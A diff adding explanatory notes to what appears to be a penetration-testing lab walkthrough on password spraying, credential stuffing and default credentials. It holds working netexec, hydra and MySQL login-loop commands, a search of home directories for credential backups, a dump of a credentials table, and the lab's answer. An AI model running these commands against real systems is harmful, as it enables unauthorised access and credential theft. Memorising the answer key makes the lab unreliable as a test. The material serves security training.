@@ -25,6 +25,7 @@ Three common credential-based attack techniques that don't require full brute fo
 ```bash
 netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
 ```
+> Tries a single password against every user in the list across the entire subnet. NetExec marks successful logins with `[+]` and adds `(Pwn3d!)` for admin-level access. Change the subnet and password to match the target environment.
 
 ---
 
@@ -40,6 +41,7 @@ netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
 # -C flag takes a colon-separated user:pass file
 hydra -C user_pass.list ssh://10.100.38.23
 ```
+> `-C` reads a colon-separated `username:password` file and tries each pair exactly once. More efficient than `-L`/`-P` for stuffing attacks since it only tries known pairs.
 
 > **Key difference:** Spraying = one password, many users. Stuffing = many known user:pass pairs from leaks.
 
@@ -60,6 +62,7 @@ pip3 install defaultcreds-cheat-sheet
 # Search for a product
 creds search linksys
 ```
+> Installs the default credentials lookup tool, then searches for known defaults by product name. Outputs a table of default usernames and passwords. Swap `linksys` for any router brand, firewall, or service name.
 
 ### Common Router Defaults
 
@@ -107,6 +110,7 @@ ls /home/
 # From SSH session, check C:\Users (if Windows) or /home (Linux)
 ls -la /home/kira/ /home/will/ /home/sam/
 ```
+> Lists all user home directories to identify local accounts. `-la` shows hidden files (dot files) which often contain credential caches, history files, and backup archives.
 
 ### Step 2 — Search for Credential Files
 
@@ -118,6 +122,7 @@ find /home -type f -readable 2>/dev/null
 # Key find: /home/will/.backups/shadow.bak (permission denied)
 # Key find: /home/will/.backups/passwd.bak (readable — confirms users)
 ```
+> Finds all files you can read under `/home`. `-type f` limits to regular files. Errors for unreadable files go to `/dev/null`. Look for `.zip`, `.bak`, `.conf`, and history files in the results.
 
 ### Step 3 — Try Credential Stuffing (Reuse Known Passwords)
 
@@ -131,6 +136,7 @@ for user in root kira will sam; do
   done
 done
 ```
+> Loops through known users and passwords to spray MySQL. `-e "SELECT 1;"` executes a simple query and exits — if it succeeds without error, the credentials work. Suppress auth failure messages with `2>/dev/null`.
 
 > **Result:** No match — the MySQL creds are different from the system creds.
 
@@ -147,6 +153,7 @@ mysql -u superdba -p'admin' -e "SELECT 1;" 2>&1
 pip3 install defaultcreds-cheat-sheet
 creds search mysql
 ```
+> Tests a specific default credential pair against MySQL. `2>&1` shows error messages so you can see auth failures vs connection failures. Use `creds search mysql` to look up other known default accounts.
 
 ### Step 5 — Enumerate the Database
 
@@ -165,6 +172,7 @@ SHOW TABLES;
 SELECT * FROM creds;
 # Dumps 100 rows of usernames and passwords
 ```
+> Opens a MySQL session, then enumerates privileges, databases, and tables. `SHOW GRANTS` reveals what the account can access. `SELECT * FROM creds` dumps the credentials table. Replace `users` and `creds` with actual names from `SHOW DATABASES` and `SHOW TABLES`.
 
 ### Answer
 `superdba:admin`
